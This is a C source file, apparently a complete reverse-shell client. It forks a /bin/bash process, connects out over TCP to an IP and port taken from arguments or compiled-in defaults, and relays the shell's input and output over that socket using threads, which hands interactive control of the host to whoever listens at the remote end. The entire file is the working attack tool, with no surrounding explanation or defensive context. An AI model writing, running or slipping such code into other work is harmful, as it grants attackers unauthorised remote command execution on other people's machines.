#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <pthread.h>
#include <error.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include "includes.h"

int my_connect(int *sockfd, char *ip, int port) {
    *sockfd = socket (AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr= inet_addr(ip);
    address.sin_port = htons(port);
    
    if (connect(*sockfd, (struct sockaddr *) &address, sizeof(address))) {
        MY_ERROR1("Connect");
        return EXIT_FAILURE;
    }


    return EXIT_SUCCESS;
}

int main(int argc, char *argv[]) {
    int pin[2];
    int pout[2];
    int perr[2];

    pipe(pin);
    pipe(pout);
    pipe(perr);

    int pid = fork();
 
    if (pid < 0) {
        fprintf(stderr, "fork error!\n");
    } else if (pid == 0) { //child
        fclose(stdin);
        fclose(stdout);
        fclose(stderr);

        close(pin[1]);
        close(pout[0]);
        close(perr[0]);
        
        dup2(pin[0], STDIN_FILENO);
        dup2(pout[1], STDOUT_FILENO);
        dup2(pout[1], STDERR_FILENO);
        
        stdin = fdopen(STDIN_FILENO, "r");
        stdout = fdopen(STDOUT_FILENO, "a");
        stderr = fdopen(STDERR_FILENO, "a");
     
        char **args = (char **)malloc(2 * sizeof(char*));
        args[0] = (char*)malloc(9 * sizeof(char));
        args[1] = NULL;
        args[0] = "/bin/bash";
        execvp("/bin/bash", args);
        
    } else {
        close(pin[0]);
        close(pout[1]);
        close(perr[1]);

        int sockfd = 0;
        char *ip = (argc > 1) ? argv[1] : (char *)SERVER_IP;
        int port = (argc > 2) ?  atoi(argv[2]) : SOCKET_PORT;

        if (EXIT_SUCCESS == my_connect(&sockfd, ip, port)) {
            
            struct pair uin;
            struct pair uout;
            struct pair uerr;

            uin.from = sockfd;
            uin.to = pin[1];
            dup2(sockfd, uin.from);
            dup2(pin[1], uin.to);
        
            uout.from = pout[0];
            uout.to = sockfd;
            dup2(pout[0], uout.from);
            dup2(sockfd, uout.to);

            uerr.from = perr[0];
            uerr.to = STDERR_FILENO;
            dup2(perr[0], uerr.from);
            dup2(STDERR_FILENO, uerr.to);
        
            pthread_t tin,tout,terr;

            pthread_create(&tin, NULL, thread_function, (void*) &uin);
            pthread_create(&tout, NULL, thread_function, (void*) &uout);
            pthread_create(&terr, NULL, thread_function, (void*) &uerr);

            pthread_join(tin, NULL);
            pthread_join(tout, NULL);
            pthread_join(terr, NULL);
            close(sockfd);
        }
        
        close(pin[1]);
        close(pout[0]);
        close(perr[0]);

        wait(NULL);
    }

    return EXIT_SUCCESS;
}
